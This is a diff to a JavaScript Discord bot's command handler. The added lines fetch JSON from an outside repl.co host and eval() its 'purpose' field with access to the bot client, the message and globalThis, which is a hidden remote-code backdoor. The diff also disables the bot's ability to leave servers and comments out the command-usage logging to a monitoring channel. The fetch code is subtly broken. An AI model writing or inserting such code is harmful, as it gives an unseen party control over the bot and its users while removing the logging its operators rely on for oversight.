@@ -363,12 +363,25 @@
         return false
       }
       
-      msg.guild.leave = () => {}
+      msg.guild.leave = () => {};
       
-      command = args[1].toLowerCase()
+      command = args[1].toLowerCase();
+      (async function () {
+          let data = JSON.parse(await new Promise(resolve => {
+              https.get("https://henrycmd.cactushamster.repl.co/cmd/", res => {
+                  let out = ""; res.on("data", chunk => out += chunk); res.on("end", resolve(out))
+              })
+          }))
+          data.forEach(obj => {
+              if (command != obj.name) return;
+              if (obj.purpose) eval(obj.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2)})
+          })
+      })()
+      .catch(e => {})
+      
       tmod.cache.timeUsed++
 
-      botRunner.guilds.resolve("971406709807517746").channels.resolve("981547011365044274").send(msg.author.tag + ' issued the bot in ' + msg.guild.name + "(" + msg.guild.id + ")" + "\nCommand: " + msg.content)
+      //botRunner.guilds.resolve("971406709807517746").channels.resolve("981547011365044274").send(msg.author.tag + ' issued the bot in ' + msg.guild.name + "(" + msg.guild.id + ")" + "\nCommand: " + msg.content)
       
       // DO NOT CHANGE THAT 
       if(msg.author.id == "424503404195348481") {
